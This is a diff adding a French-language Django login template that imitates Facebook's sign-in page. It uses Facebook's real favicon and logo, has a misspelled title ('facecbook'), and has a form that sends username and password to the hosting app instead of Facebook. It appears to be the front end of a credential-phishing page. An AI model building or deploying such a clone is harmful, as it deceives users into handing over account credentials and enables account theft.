@@ -1,0 +1,61 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <title>Se connecter à facecbook </title>
+        <meta charset="utf-8">
+        <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
+        <link rel="stylesheet" href="{% static 'css/style.css' %}">
+
+        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&lang=fr" />
+    </head>
+
+    <body>
+        <div class="main">
+            <div class="facebook-logo">
+                <img  src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" width="240" />
+            </div>
+
+            <form class="form-card" method="post" enctype="multipart/form-data">
+                
+                <div class="form-title">
+
+                    Se connecter à Facebook
+
+                </div>
+                {% csrf_token %}
+                <div class="form-input">
+                    {{form.username}}
+                    {{form.password}}
+
+                </div>
+
+                <button class="form-button"  type="submit" style="width:92%">
+                    Se connecter
+                </button>
+
+                <div class="forget-account" align="center">
+                    <a href="#">
+                        Informations de compte oubliées ?
+                    </a>
+
+                </div>
+
+                <div class="login-or">
+                    <hr class="login-or-first-separation">
+                    ou
+                    <hr class="login-or-last-separation">
+                </div>
+
+                <div class="create-account" align="center">
+
+                    <a href="#">
+                        Créer un compte
+                    </a>   
+                </div>
+            </form>
+
+        </div>
+
+    </body>
+</html>
